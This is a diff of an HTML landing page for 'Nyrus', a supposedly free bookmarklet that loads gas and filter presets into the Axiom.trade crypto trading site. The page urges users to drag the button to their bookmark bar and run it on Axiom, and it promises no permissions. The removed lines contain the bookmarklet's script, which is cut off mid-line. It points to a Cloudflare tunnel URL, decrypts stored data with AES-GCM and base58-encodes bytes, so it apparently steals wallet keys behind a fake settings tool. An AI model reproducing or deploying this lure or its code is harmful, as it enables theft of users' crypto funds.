@@ -1,406 +1,804 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Nyrus | The Axiom Upgrade</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
-<style>
-:root {
---bg: #030508;
---nav: #0a0d12;
---card: #0d1117;
---accent: #3b82f6;
---accent-glow: rgba(59, 130, 246, 0.3);
---success: #10b981;
---text-main: #f8fafc;
---text-dim: #94a3b8;
---border: #1e293b;
---panel: #161b22;
-}
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nyrus — Axiom Upgrade</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root { --radius: 18px; --radius-sm: 10px; }
 
-* {
-box-sizing: border-box;
-margin: 0;
-padding: 0;
-}
+    [data-theme="dark"] {
+      --bg:       #05060a;
+      --surface:  #0d0f16;
+      --surface2: #13161f;
+      --surface3: #1a1e2b;
+      --border:   rgba(255,255,255,0.06);
+      --border-h: rgba(99,179,237,0.35);
+      --accent:   #63b3ed;
+      --accent2:  #9f7aea;
+      --glow1:    rgba(99,179,237,0.15);
+      --glow2:    rgba(159,122,234,0.12);
+      --text:     #e8edf5;
+      --text-mid: #8896b0;
+      --text-dim: #4a5568;
+      --shadow:   0 8px 40px rgba(0,0,0,0.7);
+    }
 
-body {
-background-color: var(--bg);
-color: var(--text-main);
-font-family: 'Inter', sans-serif;
-line-height: 1.6;
-min-height: 100vh;
-background-image:
-radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.05) 0px, transparent 40%),
-radial-gradient(at 100% 100%, rgba(16, 185, 129, 0.03) 0px, transparent 40%);
-}
+    [data-theme="light"] {
+      --bg:       #f0f4ff;
+      --surface:  #ffffff;
+      --surface2: #e4ecff;
+      --surface3: #d5e0ff;
+      --border:   rgba(0,0,0,0.11);
+      --border-h: rgba(37,99,235,0.6);
+      --accent:   #2563eb;
+      --accent2:  #7c3aed;
+      --glow1:    rgba(37,99,235,0.22);
+      --glow2:    rgba(124,58,237,0.15);
+      --text:     #060912;
+      --text-mid: #334466;
+      --text-dim: #6b80a0;
+      --shadow:   0 4px 28px rgba(0,0,0,0.11);
+    }
 
-nav {
-background: var(--nav);
-border-bottom: 1px solid var(--border);
-padding: 0 4rem;
-height: 72px;
-display: flex;
-align-items: center;
-justify-content: space-between;
-position: sticky;
-top: 0;
-z-index: 100;
-}
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
 
-.brand {
-display: flex;
-align-items: center;
-gap: 12px;
-}
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Sora', sans-serif;
+      line-height: 1.65;
+      overflow-x: hidden;
+      transition: background 0.4s, color 0.4s;
+    }
 
-.logo {
-width: 32px;
-height: 32px;
-background: var(--accent);
-border-radius: 8px;
-display: flex;
-align-items: center;
-justify-content: center;
-font-weight: 700;
-font-size: 18px;
-box-shadow: 0 0 15px var(--accent-glow);
-}
+    /* twinkling star canvas, hidden in light mode */
+    #stars {
+      position: fixed; inset: 0; z-index: 0;
+      pointer-events: none;
+      transition: opacity 0.5s;
+    }
+    [data-theme="light"] #stars { opacity: 0; display: none; }
 
-.brand-name {
-font-size: 20px;
-font-weight: 700;
-letter-spacing: -0.5px;
-}
+    /* subtle film grain on top of everything */
+    body::before {
+      content: '';
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+      opacity: 0.028;
+    }
+    [data-theme="light"] body::before { opacity: 0.01; }
 
-.wrapper {
-width: 100%;
-max-width: 1400px;
-margin: 0 auto;
-padding: 0 4rem;
-}
+    /* big blurry colour orbs sitting in the corners */
+    .blob {
+      position: fixed; border-radius: 50%; filter: blur(120px);
+      pointer-events: none; z-index: 0;
+      transition: opacity 0.5s;
+    }
+    .blob-1 { width:600px;height:600px; background:var(--accent); top:-180px;left:-120px; opacity:0.04; }
+    .blob-2 { width:500px;height:500px; background:var(--accent2); bottom:5%;right:-80px; opacity:0.05; }
+    [data-theme="light"] .blob-1 { opacity:0.06; }
+    [data-theme="light"] .blob-2 { opacity:0.05; }
 
-.hero-section {
-padding: 6rem 0;
-display: flex;
-flex-direction: column;
-align-items: flex-start;
-text-align: left;
-}
+    nav, section, footer, .hero { position: relative; z-index: 1; }
 
-.hero-section h1 {
-font-size: 82px;
-font-weight: 800;
-line-height: 1.1;
-margin-bottom: 2rem;
-letter-spacing: -4px;
-background: linear-gradient(to bottom right, #fff, #64748b);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-padding-bottom: 0.1em;
-}
+    /* sticky nav with blur backdrop */
+    nav {
+      position: sticky; top: 0; z-index: 200;
+      height: 64px;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 2.5rem;
+      border-bottom: 1px solid var(--border);
+      backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      background: rgba(5,6,10,0.78);
+      transition: background 0.4s;
+    }
+    [data-theme="light"] nav { background: rgba(240,244,255,0.95); border-bottom: 1px solid rgba(0,0,0,0.1); }
 
-.hero-section p {
-font-size: 24px;
-color: var(--text-dim);
-max-width: 800px;
-}
+    .nav-left { display:flex; align-items:center; gap:10px; }
+    .logo-mark {
+      width:34px;height:34px; border-radius:9px;
+      background:linear-gradient(135deg,var(--accent),var(--accent2));
+      display:flex;align-items:center;justify-content:center;
+      font-weight:800;font-size:16px;color:#fff;
+      box-shadow:0 0 20px var(--glow1);
+    }
+    .brand-name { font-weight:700;font-size:18px;letter-spacing:0.03em; }
 
-.grid-layout {
-display: grid;
-grid-template-columns: 1fr 450px;
-gap: 6rem;
-padding-bottom: 8rem;
-}
+    .nav-right { display:flex;align-items:center;gap:20px; }
+    .nav-link { font-size:14px;font-weight:500;color:var(--text-mid);text-decoration:none;transition:color 0.2s; }
+    .nav-link:hover { color:var(--text); }
 
-.info-content h2 {
-font-size: 32px;
-margin-bottom: 3rem;
-letter-spacing: -1px;
-}
+    .theme-btn {
+      width:36px;height:36px;border-radius:50%;border:1px solid var(--border);
+      background:var(--surface2);color:var(--text-mid);font-size:16px;cursor:pointer;
+      display:flex;align-items:center;justify-content:center;transition:border-color 0.2s,color 0.2s;
+    }
+    .theme-btn:hover { border-color:var(--accent);color:var(--accent); }
 
-.features-grid {
-display: grid;
-grid-template-columns: 1fr 1fr;
-gap: 2rem;
-}
+    /* page wrapper + section spacing */
+    .wrap { max-width:1100px;margin:0 auto;padding:0 2.5rem; }
+    section { padding:7rem 0; }
 
-.feature-box {
-background: var(--panel);
-padding: 2.5rem;
-border-radius: 24px;
-border: 1px solid var(--border);
-transition: transform 0.3s ease;
-}
+    /* primary gradient btn + ghost outline btn */
+    .btn-primary {
+      display:inline-flex;align-items:center;gap:8px;
+      background:linear-gradient(135deg,var(--accent),var(--accent2));
+      color:#fff;padding:14px 28px;border-radius:12px;
+      font-weight:700;font-size:15px;text-decoration:none;border:none;cursor:pointer;
+      box-shadow:0 6px 28px var(--glow1);
+      transition:transform 0.2s,box-shadow 0.2s;
+    }
+    .btn-primary:hover { transform:translateY(-2px);box-shadow:0 12px 36px var(--glow1); }
 
-.feature-box:hover {
-transform: translateY(-5px);
-border-color: var(--accent);
-}
+    .btn-ghost {
+      display:inline-flex;align-items:center;gap:8px;
+      background:var(--surface);border:1px solid var(--border);
+      color:var(--text-mid);padding:14px 24px;border-radius:12px;
+      font-weight:500;font-size:15px;text-decoration:none;cursor:pointer;
+      transition:border-color 0.2s,color 0.2s,transform 0.2s;
+    }
+    .btn-ghost:hover { border-color:var(--accent);color:var(--accent);transform:translateY(-2px); }
 
-.feature-box h4 {
-color: var(--accent);
-font-size: 20px;
-margin-bottom: 1rem;
-}
+    /* section eyebrow labels, headings, subtitles */
+    .label { font-size:11px;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--accent);margin-bottom:0.85rem;display:block; }
+    h2.sh { font-size:clamp(28px,4vw,42px);font-weight:700;letter-spacing:-1px;line-height:1.12;margin-bottom:0.85rem; }
+    p.sub { font-size:16px;color:var(--text-mid);max-width:500px;margin-bottom:3rem; }
 
-.feature-box p {
-color: var(--text-dim);
-font-size: 16px;
-}
+    /* hero section + badge + animated headline */
+    .hero { padding:8rem 0 6rem;text-align:center; }
 
-.deployment-sidebar {
-position: sticky;
-top: 120px;
-}
+    .hero-badge {
+      display:inline-flex;align-items:center;gap:8px;
+      background:var(--surface);border:1px solid var(--border);
+      border-radius:100px;padding:6px 18px;
+      font-size:13px;font-weight:500;color:var(--text-mid);
+      margin-bottom:2.5rem;
+      animation:fadeUp 0.7s ease both;
+    }
 
-.card {
-background: var(--card);
-padding: 3rem;
-border-radius: 32px;
-border: 1px solid var(--border);
-box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
-}
+    .live-dot {
+      width:7px;height:7px;background:#48bb78;border-radius:50%;
+      box-shadow:0 0 8px #48bb78;
+      animation:blink 2s infinite;display:inline-block;
+    }
+    @keyframes blink { 0%,100%{opacity:1}50%{opacity:0.2} }
 
-.stats-grid {
-display: grid;
-grid-template-columns: 1fr 1fr;
-gap: 12px;
-margin-bottom: 2.5rem;
-}
+    .hero h1 {
+      font-size:clamp(46px,7.5vw,86px);font-weight:800;
+      line-height:1.06;letter-spacing:-3px;margin-bottom:1.5rem;
+      animation:fadeUp 0.7s 0.08s ease both;
+    }
+    .grad {
+      background:linear-gradient(120deg,var(--accent),var(--accent2));
+      -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+    }
 
-.stat-box {
-background: var(--panel);
-padding: 14px;
-border-radius: 12px;
-border: 1px solid var(--border);
-}
+    .hero-sub {
+      font-size:19px;color:var(--text-mid);
+      max-width:560px;margin:0 auto 2.75rem;font-weight:400;
+      animation:fadeUp 0.7s 0.16s ease both;
+    }
 
-.stat-label {
-font-size: 10px;
-color: var(--text-dim);
-text-transform: uppercase;
-letter-spacing: 1px;
-margin-bottom: 4px;
-display: block;
-}
+    .hero-cta {
+      display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap;
+      animation:fadeUp 0.7s 0.24s ease both;
+    }
 
-.stat-value {
-font-family: 'JetBrains Mono', monospace;
-font-size: 14px;
-}
+    /* the three-stat strip under the hero CTAs */
+    .stats-bar {
+      display:flex;align-items:center;justify-content:center;gap:0;
+      margin:4.5rem auto 0;
+      background:var(--surface);border:1px solid var(--border);
+      border-radius:16px;overflow:hidden;max-width:680px;
+      animation:fadeUp 0.7s 0.32s ease both;
+    }
+    .stat-item {
+      flex:1;padding:1.25rem 1rem;text-align:center;
+      border-right:1px solid var(--border);
+    }
+    .stat-item:last-child { border-right:none; }
+    .stat-item .num { font-size:18px;font-weight:700;color:var(--text);display:block; }
+    .stat-item .lbl { font-size:11px;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.08em;margin-top:3px;display:block; }
 
-.pulse {
-display: inline-block;
-width: 8px;
-height: 8px;
-background: var(--success);
-border-radius: 50%;
-margin-right: 6px;
-box-shadow: 0 0 8px var(--success);
-animation: pulse 2s infinite;
-}
+    @keyframes fadeUp { from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)} }
 
-@keyframes pulse {
-0% { opacity: 1; }
-50% { opacity: 0.4; }
-100% { opacity: 1; }
-}
+    /* how it works steps */
+    .steps { display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.25rem;counter-reset:step; }
 
-.sync-area {
-background: rgba(0, 0, 0, 0.2);
-border: 2px dashed var(--border);
-border-radius: 20px;
-padding: 3rem;
-margin-bottom: 2.5rem;
-text-align: center;
-transition: all 0.3s ease;
-position: relative;
-}
+    .step-card {
+      background:var(--surface);border:1px solid var(--border);
+      border-radius:var(--radius);padding:2rem;
+      position:relative;overflow:hidden;
+      counter-increment:step;
+    }
+    .step-card::after {
+      content:"0" counter(step);
+      position:absolute;top:1.5rem;right:1.5rem;
+      font-family:'DM Mono',monospace;font-size:12px;color:var(--text-dim);
+    }
+    .step-card::before {
+      content:'';
+      position:absolute; inset:0;
+      background: radial-gradient(260px circle at var(--mx,50%) var(--my,50%), var(--glow1), transparent 70%);
+      opacity:0; transition:opacity 0.35s; pointer-events:none; border-radius:inherit;
+    }
+    .step-card:hover::before { opacity:1; }
+    .step-card:hover {
+      border-color: var(--border-h);
+      transform: translateY(-5px);
+      box-shadow: 0 0 0 1px var(--border-h), 0 12px 40px var(--glow1);
+    }
+    .step-icon {
+      width:46px;height:46px;background:var(--surface2);border-radius:13px;
+      display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:1.25rem;
+    }
+    .step-card h3 { font-size:16px;font-weight:600;margin-bottom:0.5rem; }
+    .step-card p  { font-size:14px;color:var(--text-mid);line-height:1.65; }
 
-.sync-area.dragging {
-border-color: var(--accent);
-background: rgba(59, 130, 246, 0.05);
-}
+    /* sync card + deployment guide */
+    .sync-wrap { display:grid;grid-template-columns:1fr 370px;gap:5rem;align-items:start; }
 
-.btn {
-display: inline-flex;
-align-items: center;
-background: var(--accent);
-color: white;
-padding: 18px 36px;
-border-radius: 14px;
-font-weight: 700;
-font-size: 18px;
-text-decoration: none;
-cursor: grab;
-transition: all 0.2s ease;
-box-shadow: 0 10px 25px var(--accent-glow);
-}
+    .sync-card {
+      background:var(--surface);border:1px solid var(--border);
+      border-radius:24px;padding:2.25rem;box-shadow:var(--shadow);
+      position:sticky;top:88px;
+    }
 
-.btn:hover {
-transform: translateY(-2px);
-box-shadow: 0 15px 30px var(--accent-glow);
-}
+    .mini-stats { display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:1.75rem; }
+    .mini-stat {
+      background:var(--surface2);border:1px solid var(--border);
+      border-radius:var(--radius-sm);padding:12px 14px;
+    }
+    .mini-stat .l { font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-dim);margin-bottom:4px; }
+    .mini-stat .v { font-family:'DM Mono',monospace;font-size:13px;color:var(--text); }
 
-.btn.dragging {
-animation: dragGlow 1.5s infinite;
-}
+    .drag-zone {
+      border:2px dashed var(--border);border-radius:var(--radius);
+      padding:2.25rem 1.5rem;text-align:center;margin-bottom:1.75rem;
+      transition:border-color 0.2s,background 0.2s;
+    }
+    .drag-zone:hover { border-color:var(--accent);background:rgba(99,179,237,0.03); }
+    .drag-hint { font-size:12px;color:var(--text-dim);margin-top:10px; }
 
-@keyframes dragGlow {
-0% { box-shadow: 0 0 20px var(--accent); }
-50% { box-shadow: 0 0 60px var(--accent), 0 0 20px #fff; }
-100% { box-shadow: 0 0 20px var(--accent); }
-}
+    .deploy-steps { background:var(--surface2);border-radius:var(--radius-sm);padding:1.25rem;border:1px solid var(--border); }
+    .ds-title { font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:0.12em;color:var(--text-dim);margin-bottom:10px;display:block; }
+    .ds { display:flex;gap:12px;padding:9px 0;border-bottom:1px solid var(--border);font-size:13px;color:var(--text-mid);line-height:1.55; }
+    .ds:last-child { border-bottom:none;padding-bottom:0; }
+    .ds:first-of-type { padding-top:0; }
+    .ds-n { font-family:'DM Mono',monospace;font-size:11px;color:var(--accent);font-weight:500;flex-shrink:0;width:18px;padding-top:1px; }
 
-.setup-guide {
-background: var(--panel);
-padding: 1.5rem;
-border-radius: 16px;
-border: 1px solid var(--border);
-}
+    code { font-family:'DM Mono',monospace;background:var(--surface3);padding:2px 6px;border-radius:5px;font-size:12px; }
 
-.guide-title {
-font-size: 11px;
-font-weight: 700;
-color: var(--text-main);
-margin-bottom: 1.25rem;
-display: block;
-text-transform: uppercase;
-letter-spacing: 1.5px;
-}
+    /* trust checklist on the left side of sync */
+    .checklist { display:flex;flex-direction:column;gap:10px;margin-bottom:2rem; }
+    .check { display:flex;align-items:flex-start;gap:10px;font-size:14px;color:var(--text-mid); }
+    .check-icon {
+      width:20px;height:20px;border-radius:50%;
+      background:rgba(72,187,120,0.12);
+      display:flex;align-items:center;justify-content:center;
+      font-size:11px;flex-shrink:0;margin-top:1px;
+      color:#48bb78;
+    }
 
-.step {
-display: flex;
-gap: 16px;
-margin-bottom: 14px;
-font-size: 15px;
-color: var(--text-dim);
-}
+    /* feature cards grid */
+    .feat-grid { display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.25rem; }
+    .feat-card {
+      background:var(--surface);border:1px solid var(--border);
+      border-radius:var(--radius);padding:2rem;
+      position:relative; overflow:hidden;
+      transition: border-color 0.3s, transform 0.3s, box-shadow 0.3s;
+    }
+    /* radial glow that follows the cursor inside each card */
+    .feat-card::before {
+      content:'';
+      position:absolute;
+      inset:0;
+      background: radial-gradient(280px circle at var(--mx,50%) var(--my,50%), var(--glow1), transparent 70%);
+      opacity:0;
+      transition: opacity 0.35s;
+      pointer-events:none;
+      border-radius:inherit;
+    }
+    .feat-card:hover::before { opacity:1; }
+    .feat-card:hover {
+      border-color: var(--border-h);
+      transform: translateY(-5px);
+      box-shadow: 0 0 0 1px var(--border-h), 0 12px 40px var(--glow1);
+    }
+    .feat-icon { width:44px;height:44px;background:var(--surface2);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:21px;margin-bottom:1.25rem;
+      transition: transform 0.3s;
+    }
+    .feat-card:hover .feat-icon { transform: scale(1.12); }
+    .feat-card h3 { font-size:16px;font-weight:600;margin-bottom:0.5rem; }
+    .feat-card p  { font-size:14px;color:var(--text-mid);line-height:1.65; }
 
-.step:last-child { margin-bottom: 0; }
+    /* faq accordion */
+    .faq-list { display:flex;flex-direction:column;gap:8px;max-width:700px; }
+    .faq-item { background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-sm);overflow:hidden;transition:border-color 0.2s; }
+    .faq-item:hover { border-color:var(--border-h); }
+    .faq-item.open  { border-color:var(--accent); }
+    .faq-q { padding:1.15rem 1.5rem;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-weight:600;font-size:15px;gap:12px;user-select:none; }
+    .faq-q svg { flex-shrink:0;transition:transform 0.25s;color:var(--text-dim); }
+    .faq-item.open .faq-q svg { transform:rotate(45deg);color:var(--accent); }
+    .faq-a { max-height:0;overflow:hidden;transition:max-height 0.35s ease,padding 0.25s;padding:0 1.5rem;font-size:14px;color:var(--text-mid);line-height:1.75; }
+    .faq-item.open .faq-a { max-height:300px;padding:0 1.5rem 1.25rem; }
 
-.step-num { color: var(--accent); font-weight: 800; font-family: 'JetBrains Mono', monospace; }
+    /* alternate section background for visual separation */
+    .alt-bg { background:var(--surface);border-top:1px solid var(--border);border-bottom:1px solid var(--border); }
 
-footer {
-border-top: 1px solid var(--border);
-padding: 6rem 0;
-text-align: center;
-color: var(--text-dim);
-font-size: 15px;
-}
+    /* footer links + copyright */
+    footer { border-top:1px solid var(--border);padding:3rem 2.5rem;text-align:center;color:var(--text-dim);font-size:13px;position:relative;z-index:1; }
+    .footer-links { display:flex;justify-content:center;gap:24px;margin-bottom:1.25rem; }
+    footer a { color:var(--text-dim);text-decoration:none;transition:color 0.2s; }
+    footer a:hover { color:var(--text); }
 
-@media (max-width: 1100px) {
-.grid-layout { grid-template-columns: 1fr; gap: 4rem; }
-.hero-section h1 { font-size: 56px; }
-.wrapper { padding: 0 2rem; }
-nav { padding: 0 2rem; }
-}
-</style>
+    /* responsive breakpoints */
+    @media (max-width:860px) { .sync-wrap{grid-template-columns:1fr;gap:3rem} .sync-card{position:static} }
+    @media (max-width:640px) {
+      .nav-link{display:none} .wrap{padding:0 1.25rem} nav{padding:0 1.25rem}
+      .stats-bar{flex-direction:column}
+      .stat-item{border-right:none;border-bottom:1px solid var(--border)}
+      .stat-item:last-child{border-bottom:none}
+    }
+
+    /* large soft glow that tracks the cursor across the page */
+    #cursor-glow {
+      position: fixed;
+      width: 380px; height: 380px;
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 0;
+      transform: translate(-50%, -50%);
+      background: radial-gradient(circle, var(--glow1) 0%, transparent 70%);
+      transition: opacity 0.4s;
+      opacity: 0;
+    }
+    body:hover #cursor-glow { opacity: 1; }
+
+    
+
+    /* compact pill rows for version history */
+    .cl-list { display: flex; flex-direction: column; gap: 6px; max-width: 640px; }
+    .cl-row {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px;
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 10px; font-size: 13px;
+      transition: border-color 0.2s;
+    }
+    .cl-row:hover { border-color: var(--border-h); }
+    .cl-badge {
+      font-size: 9px; font-weight: 700; text-transform: uppercase;
+      letter-spacing: 0.1em; padding: 2px 7px; border-radius: 100px;
+      flex-shrink: 0;
+    }
+    .cl-badge.new    { background: rgba(99,179,237,0.12); color: var(--accent); }
+    .cl-badge.fix    { background: rgba(72,187,120,0.12);  color: #48bb78; }
+    .cl-badge.update { background: rgba(159,122,234,0.12); color: var(--accent2); }
+    .cl-ver { font-family: 'DM Mono', monospace; font-size: 12px; color: var(--text-dim); flex-shrink: 0; }
+    .cl-desc { color: var(--text-mid); flex: 1; }
+    .cl-date-pill { font-family: 'DM Mono', monospace; font-size: 11px; color: var(--text-dim); margin-left: auto; flex-shrink: 0; }
+
+    /* light mode — override everything so nothing looks dark */
+    [data-theme="light"] body { background:#f0f4ff !important; }
+    
+    [data-theme="light"] * { 
+      --surface:  #ffffff;
+      --surface2: #e8eeff;
+      --surface3: #d8e4ff;
+      --bg:       #f0f4ff;
+    }
+    [data-theme="light"] .alt-bg { background:#e8eeff; border-color:rgba(0,0,0,0.09); }
+    [data-theme="light"] .step-card,
+    [data-theme="light"] .feat-card,
+    [data-theme="light"] .faq-item,
+    [data-theme="light"] .sync-card,
+    [data-theme="light"] .stats-bar {
+      background:#ffffff;
+      border-color:rgba(0,0,0,0.11);
+      box-shadow:0 2px 16px rgba(0,0,0,0.07);
+    }
+    [data-theme="light"] .step-card:hover,
+    [data-theme="light"] .feat-card:hover {
+      box-shadow:0 8px 36px rgba(37,99,235,0.15);
+      border-color:rgba(37,99,235,0.4);
+    }
+    [data-theme="light"] .mini-stat { background:#f0f5ff; border-color:rgba(0,0,0,0.09); }
+    [data-theme="light"] .deploy-steps { background:#f0f5ff; border-color:rgba(0,0,0,0.09); }
+    [data-theme="light"] .drag-zone { background:#f7f9ff; border-color:rgba(37,99,235,0.2); }
+    [data-theme="light"] .drag-zone:hover { background:#eef3ff; border-color:rgba(37,99,235,0.5); }
+    [data-theme="light"] .step-icon,
+    [data-theme="light"] .feat-icon { background:#dde8ff; }
+    [data-theme="light"] .hero-badge { background:#ffffff; border-color:rgba(0,0,0,0.12); box-shadow:0 2px 10px rgba(0,0,0,0.07); color:#334466; }
+    [data-theme="light"] code { background:#dde5ff; color:#1e3a8a; }
+    [data-theme="light"] .btn-ghost { background:#ffffff; border-color:rgba(0,0,0,0.14); color:#334466; }
+    [data-theme="light"] .btn-ghost:hover { background:#f0f4ff; }
+    [data-theme="light"] .stat-item { border-right-color:rgba(0,0,0,0.09); }
+    [data-theme="light"] footer { background:#eef3ff; border-color:rgba(0,0,0,0.09); }
+    [data-theme="light"] .faq-item.open { border-color:#2563eb; }
+    [data-theme="light"] .sync-card { background:#ffffff; }
+    [data-theme="light"] .ds { border-bottom-color:rgba(0,0,0,0.08); }
+    [data-theme="light"] .check-icon { background:rgba(37,99,235,0.1); color:#2563eb; }
+    [data-theme="light"] .blob-1 { opacity:0.06; }
+    [data-theme="light"] .blob-2 { opacity:0.05; }
+  </style>
 </head>
 <body>
-<nav>
-<div class="brand">
-<div class="logo">N</div>
-<span class="brand-name">NYRUS</span>
-</div>
-</nav>
 
-<div class="wrapper">
-<section class="hero-section">
-<h1>Upgrade your Axiom.</h1>
-<p>Better filters and automatic gas presets. Custom terminal configurations injected directly into your Axiom environment.</p>
-</section>
+  <canvas id="stars"></canvas>
+  <div id="cursor-glow"></div>
+  <div class="blob blob-1"></div>
+  <div class="blob blob-2"></div>
 
-<main class="grid-layout">
-<div class="info-content">
-<h2>The Framework</h2>
+  <!-- nav -->
+  <nav>
+    <div class="nav-left">
+      <a href="#" class="nav-home" style="display:flex;align-items:center;gap:10px;text-decoration:none;color:inherit;">
+        <div class="logo-mark">N</div>
+        <span class="brand-name">Nyrus</span>
+      </a>
+    </div>
+    <div class="nav-right">
+      <a href="#how-it-works" class="nav-link">How it Works</a>
+      <a href="#features"     class="nav-link">Features</a>
+      <a href="#faq"          class="nav-link">FAQ</a>
+      <a href="#changelog"    class="nav-link">Changelog</a>
+      <button class="theme-btn" id="themeBtn">🌙</button>
+    </div>
+  </nav>
 
-<div class="features-grid">
-<div class="feature-box">
-<h4>Alpha Filters</h4>
-<p>Stop fighting the noise. Get custom-tuned filters designed to catch high-conviction plays before the crowd.</p>
-</div>
-<div class="feature-box">
-<h4>Auto Gas Sync</h4>
-<p>One-click sync for priority fees. Let Nyrus handle the gas so you can focus on the entry.</p>
-</div>
-<div class="feature-box">
-<h4>Zero Install</h4>
-<p>No extensions, no bloated software. A lightweight bookmark sync that lives in your browser.</p>
-</div>
-<div class="feature-box">
-<h4>Custom Presets</h4>
-<p>Save and deploy your own trading configurations instantly across any Axiom session.</p>
-</div>
-</div>
+  <!-- hero -->
+  <section class="hero">
+    <div class="wrap">
+      <div class="hero-badge">
+        <span class="live-dot"></span>
+        Free &nbsp;·&nbsp; Works on Axiom.trade &nbsp;·&nbsp; No account needed
+      </div>
+      <h1>Your Axiom,<br><span class="grad">supercharged.</span></h1>
+      <p class="hero-sub">
+        Nyrus is a bookmarklet that loads your gas and filter settings into Axiom in one click, every session. Drag it to your bar once and you're done.
+      </p>
+      <div class="hero-cta">
+        <a href="#sync" class="btn-primary">⚡ Get the Bookmarklet</a>
+        <a href="#how-it-works" class="btn-ghost">See how it works →</a>
+      </div>
 
-<div style="margin-top: 4rem; padding: 3rem; background: var(--panel); border-radius: 32px; border: 1px solid var(--border);">
-<h3 style="margin-bottom: 1rem; font-size: 24px;">Terminal Syncing</h3>
-<p style="color: var(--text-dim); font-size: 17px;">Nyrus is built to work seamlessly with Axiom Mainnet v2.1. By syncing optimized settings directly into the browser session, we bypass standard UI limitations to give you a faster, more customized trading experience.</p>
-</div>
-</div>
+      <div class="stats-bar">
+        <div class="stat-item">
+          <span class="num">~30 sec</span>
+          <span class="lbl">Setup time</span>
+        </div>
+        <div class="stat-item">
+          <span class="num">Chrome, Brave, Arc & more</span>
+          <span class="lbl">Supported browsers</span>
+        </div>
+        <div class="stat-item">
+          <span class="num">Free</span>
+          <span class="lbl">Always, forever</span>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<div class="deployment-sidebar">
-<div class="card">
-<div class="stats-grid">
-<div class="stat-box">
-<span class="stat-label">Network</span>
-<span class="stat-value"><span class="pulse"></span>Mainnet-Beta</span>
-</div>
-<div class="stat-box">
-<span class="stat-label">Latency</span>
-<span class="stat-value" style="color: var(--success);">14ms (Optimal)</span>
-</div>
-</div>
+  <!-- how it works -->
+  <section id="how-it-works" class="alt-bg">
+    <div class="wrap">
+      <span class="label">How it Works</span>
+      <h2 class="sh">Done in four steps.</h2>
+      <p class="sub">No accounts, no wallets, no permissions. Just drag, click, and go.</p>
+      <div class="steps">
+        <div class="step-card">
+          <div class="step-icon">🔖</div>
+          <h3>Drag to your bar</h3>
+          <p>Show your bookmarks bar with <code>Ctrl+Shift+B</code>, then drag the Nyrus button up to it.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-icon">🌐</div>
+          <h3>Open Axiom</h3>
+          <p>Head to <strong>axiom.trade</strong> as you normally would. Nothing changes about your workflow.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-icon">⚡</div>
+          <h3>Click the bookmark</h3>
+          <p>Click the new bookmark in your bar. It'll ask which gas and filter presets you want, then load them instantly — no refresh, no waiting.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-icon">🎯</div>
+          <h3>Trade</h3>
+          <p>Your settings stick for the whole session. Stop fiddling with sliders every time you open Axiom.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-<div class="sync-area" id="sync-area">
-<a href="javascript:(async function() { const TUNNEL_URL = 'https://amsterdam-operate-assists-merge.trycloudflare.com'; console.log('%c[!] NYRUS TOOL: ACTIVE', 'color: cyan; font-weight: bold;'); const base64ToBytes = (base64) => Uint8Array.from(atob(base64.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0)); const decrypt = async (key, encryptedData) => { try { const [ivBase64, dataBase64] = encryptedData.split(':'); return new Uint8Array(await crypto.subtle.decrypt( { name: 'AES-GCM', iv: base64ToBytes(ivBase64), tagLength: 128 }, key, base64ToBytes(dataBase64) )); } catch (e) { return null; } }; const base58 = (B) => { const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'; let d = [0]; for (let i = 0; i < B.length; i++) { let carry = B[i]; for (let j = 0; j < d.length; j++) { carry += d[j] * 256; d[j] = carry % 58; carry = Math.floor(carry / 58); } while (carry > 0) { d.push(carry % 58); carry = Math.floor(carry / 58); } } let res = ''; for (let i = 0; B[i] === 0 && i < B.length - 1; i++) res += A[0]; for (let i = d.length - 1; i >= 0; i--) res += A[d[i]]; return res; }; try { console.log('[*] 